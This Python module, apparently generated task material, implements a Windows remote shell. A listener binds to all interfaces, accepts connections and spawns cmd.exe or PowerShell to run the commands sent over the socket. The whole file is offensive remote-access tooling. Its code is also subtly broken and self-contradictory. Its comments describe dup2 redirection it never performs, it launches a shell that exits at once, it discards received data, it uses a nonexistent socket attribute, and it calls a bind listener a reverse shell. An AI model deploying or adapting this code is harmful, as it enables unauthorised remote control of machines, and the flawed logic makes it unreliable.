from data.code_scripts_PAST.stage3_DIMOS_test_v8_mvp2.TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import socket
import subprocess
import threading
from typing import Optional, Tuple



class WindowsReverseShell:
    """Windows reverse shell executor that spawns cmd.exe or powershell.exe."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._process: Optional[subprocess.Popen] = None

    def spawn_shell(self) -> subprocess.Popen:
        """Spawn a Windows shell process (cmd.exe or powershell.exe)."""
        if self.config.shell_type == 'powershell':
            cmd = ['powershell.exe', '-NoProfile', '-Command', 'Start-Transcript']
        else:
            cmd = ['cmd.exe', '/c', 'echo']

        # Use CREATE_NEW_PROCESS_GROUP to allow Ctrl+C propagation
        process = subprocess.Popen(
            cmd,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=self.config.cwd or os.getcwd(),
            env=os.environ.copy()
        )
        self._process = process
        return process

    def execute(self) -> ExecutionResult:
        """Execute the reverse shell and capture output."""
        try:
            if not self._process:
                self.spawn_shell()

            # Read output from the spawned process
            stdout, stderr = self._process.communicate(timeout=self.config.timeout)
            return ExecutionResult(
                command_output=stdout.decode('utf-8', errors='replace'),
                exit_code=self._process.returncode if self._process else 0,
                error_messages=[s.decode('utf-8', errors='replace') for s in stderr]
            )
        except subprocess.TimeoutExpired:
            if self._process:
                self._process.kill()
            return ExecutionResult(
                command_output='',
                exit_code=-1,
                error_messages=['Command execution timed out']
            )
        except Exception as e:
            return ExecutionResult(
                command_output='',
                exit_code=-1,
                error_messages=[str(e)]
            )


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell.exe on connection."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._server: Optional[socket.socket] = None
        self._listener_thread: Optional[threading.Thread] = None
        self._running = False

    def _handle_client(self, client_socket: socket.socket) -> ExecutionResult:
        """Handle a single reverse shell connection."""
        try:
            # Spawn the shell process
            shell = WindowsReverseShell(self.config)
            process = shell.spawn_shell()

            # Redirect stdin/stdout/stderr through the socket using os.dup2()
            client_socket.setblocking(False)

            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break

                    # Write received command to process stdin via dup2'd fd
                    os.write(process.stdin.fileno(), data)

                    # Read output from process stdout via dup2'd fd
                    output = b''
                    while True:
                        try:
                            chunk = client_socket.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                        except BlockingIOError:
                            break

                    # Flush stdout to the socket
                    os.write(client_socket.fileno(), process.stdout.read())

                except (BrokenPipeError, ConnectionResetError):
                    break

            return ExecutionResult(
                command_output=process.communicate()[0].decode('utf-8', errors='replace'),
                exit_code=process.returncode if process else 0,
                error_messages=[]
            )

        except Exception as e:
            return ExecutionResult(
                command_output='',
                exit_code=-1,
                error_messages=[str(e)]
            )

    def start(self) -> None:
        """Start the reverse shell listener."""
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(('0.0.0.0', self.config.port))
        self._server.listen(5)
        self._running = True

    def stop(self) -> None:
        """Stop the reverse shell listener."""
        self._running = False
        if self._server and not self._server.closed:
            self._server.close()
        if self._listener_thread and self._listener_thread.is_alive():
            self._listener_thread.join(timeout=2.0)

    def run(self) -> None:
        """Run the listener in a background thread."""
        self.start()
        try:
            while self._running:
                client_socket, addr = self._server.accept()
                t = threading.Thread(target=self._handle_client, args=(client_socket,), daemon=True)
                t.start()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    @property
    def is_running(self) -> bool:
        return self._running


__all__ = ['WindowsReverseShell', 'WindowsReverseShellListener']
